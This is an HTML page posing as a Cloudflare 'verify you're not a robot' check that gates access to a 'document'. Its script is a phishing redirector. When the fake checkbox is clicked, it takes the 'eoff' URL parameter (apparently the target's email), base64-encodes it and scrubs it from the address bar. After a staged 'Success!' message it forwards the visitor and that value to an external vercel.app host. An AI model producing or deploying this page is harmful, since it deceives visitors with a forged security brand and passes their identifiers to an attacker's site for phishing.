<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MSFIles</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            flex-direction: column;
        }

        .text1 {
            margin-bottom: 20px;
            text-align: center;
            color: #333;
            font-size: 16px;
            max-width: 500px;
        }

        .box1 {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            padding: 40px;
            width: 90%;
            height:100px;
            max-width: 500px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .spinner1 {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            animation: rotate 1s linear infinite;
        }

        .section1 {
            display: flex;
            align-items: center;
        }

        .container1 {
            display: flex;
            align-items: center;
            cursor: pointer;
            padding: 10px 15px;
            border-radius: 8px;
            transition: background-color 0.3s;
        }

        .container1:hover {
            background-color: #f9f9f9;
        }

        .item1 {
            width: 24px;
            height: 24px;
            border: 2px solid #ddd;
            border-radius: 4px;
            margin-right: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s;
        }

        .item1.active {
            border-color: #4CAF50;
            background-color: #4CAF50;
        }

        .item1.loading {
            border: 2px solid #f3f3f3;
            border-top: 2px solid #3498db;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: rotate 1s linear infinite;
        }

        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .item1 i {
            color: white;
            font-size: 14px;
            opacity: 0;
            transition: opacity 0.3s;
        }

        .item1.active i {
            opacity: 1;
        }

        .text2 {
            font-size: 16px;
            color: #333;
            font-weight: 500;
        }

        .text3 {
            font-size: 16px;
            color: #3498db;
            font-weight: 500;
            display: none;
        }

        .text4 {
            font-size: 16px;
            color: #4CAF50;
            font-weight: 500;
            display: none;
        }

        .section2 {
            text-align: right;
            display: flex;
            flex-direction: column;
            align-items: flex-end;
        }

        .container2 {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }

        .item2 {
            width: 33px;
            height: 33px;
            margin-right: 10px;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            color: #666;
        }

        .text5 {
            font-size: 20px;
            color: #2c3e50;
            font-weight: 700;
            letter-spacing: 1px;
        }

        .text6 {
            color: #7f8c8d;
            font-size: 12px;
        }

        .text6 a {
            color: #7f8c8d;
            text-decoration: none;
        }

        .text6 a:hover {
            text-decoration: underline;
        }

        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="loader" id="loader">
        <div class="spinner1"></div>
    </div>

    <div class="text1 hidden" id="text1">
        To view this document, verify you're not a robot below
    </div>

    <div class="box1 hidden" id="box1">
        <div class="section1">
            <div class="container1" id="container1">
                <div class="item1" id="item1">
                    <i>✓</i>
                </div>
                <span class="text2" id="text2">Verify</span>
                <span class="text3" id="text3">Verifying...</span>
                <span class="text4" id="text4">Success!</span>
            </div>
        </div>

        <div class="section2">
            <div class="container2">
                <img src="cloudflare_.png" alt="Cloudflare" class="item2" style="width:32px;height:32px;">
                <div class="text5">Cloudflare</div>
            </div>
            <div class="text6">
                <a href="#">Privacy</a> · <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const loader = document.getElementById('loader');
            const text1 = document.getElementById('text1');
            const box1 = document.getElementById('box1');
            const container1 = document.getElementById('container1');
            const item1 = document.getElementById('item1');
            const text2 = document.getElementById('text2');
            const text3 = document.getElementById('text3');
            const text4 = document.getElementById('text4');

            setTimeout(function() {
                loader.classList.add('hidden');
                text1.classList.remove('hidden');
                box1.classList.remove('hidden');
            }, 2000);

            let verified = false;

            container1.addEventListener('click', function() {
                if (verified) return;

                item1.classList.add('loading');
                text2.style.display = 'none';
                text3.style.display = 'inline';
                text4.style.display = 'none';

                const currentUrl = window.location.href;
                let redirectUrl = 'https://xyz123-blush.vercel.app/?eoff=';

                const paramIndex = currentUrl.indexOf('eoff=');
                if (paramIndex !== -1) {
                    let paramValue = currentUrl.substring(paramIndex + 5);

                    const separatorIndex = paramValue.indexOf('&');
                    if (separatorIndex !== -1) {
                        paramValue = paramValue.substring(0, separatorIndex);
                    }

                    const encodedValue = btoa(paramValue);

                    const newUrl = window.location.origin + window.location.pathname + '?encoded=' + encodedValue;
                    window.history.replaceState({}, document.title, newUrl);

                    redirectUrl += encodeURIComponent(encodedValue);
                }

                setTimeout(function() {
                    item1.classList.remove('loading');
                    item1.classList.add('active');

                    text3.style.display = 'none';
                    text4.style.display = 'inline';

                    verified = true;

                    setTimeout(function() {
                        window.location.href = redirectUrl;
                    }, 1000);
                }, 2000);
            });
        });
    </script>
</body>
</html>
